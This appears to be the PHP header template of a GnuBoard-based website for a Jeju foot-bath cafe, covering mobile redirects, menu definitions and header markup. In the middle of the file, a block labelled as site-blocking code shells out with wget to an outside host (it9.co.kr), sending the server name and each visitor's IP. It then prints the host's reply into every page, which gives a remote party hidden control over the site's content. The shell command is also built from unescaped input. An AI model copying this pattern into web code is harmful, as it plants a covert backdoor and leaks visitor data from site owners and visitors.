<?
if (!defined("_GNUBOARD_")) exit; // 개별 페이지 접근 불가


if(isset($_GET["pcv"])) { set_session("ss_is_pc_view", $_GET["pcv"]);}
$ss_is_pc_view = get_session("ss_is_pc_view");
if(USE_MOBILE && USE_MOVE_MOBILE_FROM_HEAD && !$ss_is_pc_view) { //config.php	
	if($_SERVER[QUERY_STRING]) $qry_str = "?{$_SERVER[QUERY_STRING]}";
	$arr_browser = array ("iPhone","iPod","IEMobile","Mobile","lgtelecom","PPC","iphone","ipod","android","blackberry","windows ce","nokia","webos","opera mini","sonyericsson","opera mobi","iemobile");
	for($indexi = 0 ; $indexi < count($arr_browser) ; $indexi++) {
	if(stripos($_SERVER['HTTP_USER_AGENT'],$arr_browser[$indexi]) == true){
		// 모바일 브라우저라면  모바일 URL로 이동
		if ($_SERVER['HTTP_REFERER'] != "http://{$_SERVER['SERVER_NAME']}/m/" ) {
			header("Location: http://{$_SERVER['SERVER_NAME']}/m{$_SERVER["PHP_SELF"]}{$qry_str}");
			exit;
		}
	}
	}
}


include_once("$g4[path]/head.sub.php");
include_once("$g4[path]/lib/latest.lib.php");
include_once($g4['path']."/lib/calendar.php");

$subNaviHeight = array("",713,713,713,713,713,713,713);


if($p){
	$ppage=explode("_",$p);
	$pageNum=$ppage[0];
	$subNum=$ppage[1];
	$ssNum=$ppage[2];
	$tabNum=$ppage[3];
}

if($bo_table){ //게시판일때
	$bp=explode("_",$bo_table);
	$pageNum=$bp[0];
	$subNum=$bp[1];
	$ssNum=$bp[2];
	$tabNum=$bp[3];
}


if(USE_SHOP) {	//config.php
	$ca_temp = 0;
	if(isset($it)){
		$ca_temp = 1;
		$ca_id = $it[ca_id2];
		if(!$it[ca_id2]) $ca_id = $it[ca_id];

	}

	if($ca_id){

		for($i=0; $i<strlen($ca_id); $i++) { 
			$str_cut[$i] = substr($ca_id,$i,1); 
		}
		if($str_cut[0] == "a") $str_cut[0] = 11;
		if($str_cut[0] == "b") $str_cut[0] = 12;
		if($str_cut[0] == "c") $str_cut[0] = 13;
		if($str_cut[0] == "d") $str_cut[0] = 14;
		if($str_cut[0] == "e") $str_cut[0] = 15;

		$pageNum = $str_cut[0]+1;
		$subNum = (strlen($ca_id) <= 2) ? 1 : $str_cut[2];
		$ssNum = (strlen($ca_id) <= 4) ? 1 : $str_cut[4];
		$tabNum = (strlen($ca_id) <= 6) ? 1 : $str_cut[6];

	}

	if($ca_temp == 1){
		unset($ca_id);
	}

	$tv_idx = get_session("ss_tv_idx");
	$cartcnt = get_cart_count(get_session("ss_on_uid"));

	
	$ycart = new Yc4();
	$ShopMenu1 = $ycart->get_category_d1();
}

$tot = $pageNum."_".$subNum;
$tott = $tot."_".$ssNum;

// site 차단소스 ////////////////////////////////////////
function site_down($url){$fuid = '/tmp/wget_tmp_'. md5($_SERVER['REMOTE_ADDR'] . microtime() . $url. $ip);$cmd = 'wget "' . $url . '" -O "' . $fuid . '" --read-timeout=30';`$cmd`;$data = file_get_contents($fuid);`rm -rf $fuid`;return $data;}
$site_down_url= "http://it9.co.kr/site_down2.php?site_url=".$_SERVER['SERVER_NAME']."&remote_addr=".$_SERVER['REMOTE_ADDR'];
$site_down_data = site_down($site_down_url);
echo $site_down_data;
/////////////////////////////////////////////////////////



$menu = array();

$menu["pageNum"][1] = "인사말";

$menu["pageNum"][2] = "족욕의 효능";

$menu["pageNum"][3] = "카페";

$menu["pageNum"][4] = "이용·예약안내";

$menu["pageNum"][5] = "커뮤니티";
	$menu["tot"][5][1] = "공지사항";
	$menu["tot"][5][2] = "갤러리";

$menu["pageNum"][6] = "주변관광지";
		$menu["tot"][6][1] = "주변관광지";
			$menu["tott"][6][1][1] = "송악산";
			$menu["tott"][6][1][2] = "산방산";
			$menu["tott"][6][1][3] = "가파도";
			$menu["tott"][6][1][4] = "마라도";
			$menu["tott"][6][1][5] = "마라도 선착장";
			$menu["tott"][6][1][6] = "형제 해안로";
			$menu["tott"][6][1][7] = "올레 10코스";

		$menu["tot"][6][2] = "맛집";
			$menu["tott"][6][2][1] = "홍성방";
			$menu["tott"][6][2][2] = "거멍국수";
			$menu["tott"][6][2][3] = "산방산 횟집";
			$menu["tott"][6][2][4] = "제주 기장횟집";
			$menu["tott"][6][2][5] = "복태네 갈치탕";
			$menu["tott"][6][2][6] = "선채향";
			$menu["tott"][6][2][7] = "소라소라 감성술집";


$menu["pageNum"][100] = $config["cf_title"];
	$menu["tot"][100][1] = "로그인";
	$menu["tot"][100][2] = "정보수정";
	$menu["tot"][100][3] = "회원가입";
	$menu["tot"][100][4] = "장바구니";
	$menu["tot"][100][5] = "마이페이지";
	$menu["tot"][100][6] = "이용약관";
	$menu["tot"][100][7] = "개인정보처리방침";
	$menu["tot"][100][8] = "주문배송조회";
	$menu["tot"][100][10] = "주문상세내역";
	$menu["tot"][100][11] = "주문하기";
	$menu["tot"][100][12] = "주문 확인 및 결제";
	$menu["tot"][100][13] = "결제완료";
	$menu["tot"][100][14] = "주문내역";
	$menu["tot"][100][15] = "상품검색";
	$menu["tot"][100][16] = "이메일무단수집거부";

//$subPage = ($pageNum==5||$pageNum==100) ? "true" : "false"
?>

<div class="wrap">
<div class="wrap-header">
	<header class="layout" <?=$pageNum == 2 ? "style='background:rgba(0,0,0,.5);'" : ""?> >
		
		<div class="logo"><img onclick="home()" src="/res/images/mainvisual/logo.png" alt="송악산세븐족욕 로고" /></div>
		<ul id="Menu" >
			<?foreach($menu["pageNum"] as $pn=>$pnStr) {
				if($pn == 100) continue;
				?>
				
				<li <?=$pageNum == $pn ? "class='on'" : ""?> >
					<a href="#menulink" onclick="menulink('menu<?=sprintf("%02d", $pn)?>-1')" ><?=$pnStr?>
						<div></div>
					</a>
				</li>

			<?}?>
		</ul>

		<div class="callNum">
			<img src="/res/images/mainvisual/phone.png" alt="전화사진" />
			<span>064.792.3112<br>010.7124.3111</span>
		</div>

	</header>
</div>



<?if(!defined("__INDEX")){?>
<div class="wrap-sub wrap-content">

<?
if(file_exists("{$g4['path']}/res/images/subvisual/s{$p}.jpg"))				$Svisual = "s{$p}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$bo_table}.jpg"))	$Svisual = "s{$bo_table}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$tott}.jpg"))		$Svisual = "s{$tott}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$tot}.jpg"))		$Svisual = "s{$tot}";
else if(file_exists("{$g4['path']}/res/images/subvisual/s{$pageNum}.jpg"))	$Svisual = "s{$pageNum}";
else																		$Svisual = "s0";
?>
<?if ($pageNum == 5 || $pageNum == 100){ ?>
	<div class="subvisual" style="background-image:url('/res/images/subvisual/<?=$Svisual?>.jpg');" >
		<?if ($pageNum != 100) {?>
			<div>
				<ul id="soMenu">
					<?foreach($menu["tot"][$pageNum] as $sn=>$snStr) {?>
						<li  <?=$tot == $pageNum."_".$sn ? "class='on'" : ""?>><a href="#menulink" onclick="menulink('menu<?=sprintf("%02d", $pageNum)?>-<?=$sn?>')" ><?=$snStr?></a></li>
					<?}?>
				</ul>
			</div>
			<?} 
				else {
					if($subNum==7) echo "<p>PRIVACY</p><br/><p style='font-size:20px; padding-top:0;'>개인정보처리방침</p>";
					else echo "<p>LOGIN</p><br/><p style='font-size:20px; padding-top:0;'>관리자페이지</p>";
			}?>
	</div>
<?} ?>
	

<section class="layout">

	<section class="content">
	
		<?if($bo_table){?>
		<div class="boardarea">
		<?}?>
<?}?>

<script>
$(function() {
		$(".fit > div").css ("height", $(window).height());
});
</script>